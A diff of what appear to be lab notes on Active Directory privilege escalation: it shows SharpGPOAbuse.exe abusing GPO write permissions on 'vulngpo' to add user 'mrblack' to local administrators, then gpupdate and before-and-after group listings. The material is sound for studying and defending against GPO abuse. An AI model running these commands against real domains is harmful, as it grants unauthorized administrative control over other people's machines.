@@ -9,6 +9,8 @@ users has gpo write permissions
 
 we will use "SharpGPOAbuse.exe "  and edit gpo to add a user to local admin group
 
+check current local admins
+
 	PS C:\Users\testuser\Desktop\PowerSploit\Recon> net localgroup administrators
 	Alias name     administrators
 	Comment        Administrators have complete and unrestricted access to the computer/domain
@@ -23,6 +25,7 @@ we will use "SharpGPOAbuse.exe "  and edit gpo to add a user to local admin grou
 	win10
 	The command completed successfully.
 
+abuse permissons
 
 	PS C:\Users\testuser\Desktop\PowerSploit\Recon> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount mrblack --GPOName "vulngpo"
 	[+] Domain = valhalla.local
@@ -37,12 +40,15 @@ we will use "SharpGPOAbuse.exe "  and edit gpo to add a user to local admin grou
 	[+] Done!
 	
 
+get policy update
+
 	PS C:\Users\testuser\Desktop\PowerSploit\Recon> gpupdate /force
 	Updating policy...
 
 	Computer Policy update has completed successfully.
 	User Policy update has completed successfully.
 
+check local admins after abuse
 
 	PS C:\Users\testuser\Desktop\PowerSploit\Recon> net localgroup administrators
 	Alias name     administrators
@@ -55,7 +61,8 @@ we will use "SharpGPOAbuse.exe "  and edit gpo to add a user to local admin grou
 	VALHALLA\mrblack
 	The command completed successfully.
 
-  
+check current users
+
 	PS C:\Users\testuser\Desktop\PowerSploit\Recon> net user
 
 	User accounts for \\PC-WIN10
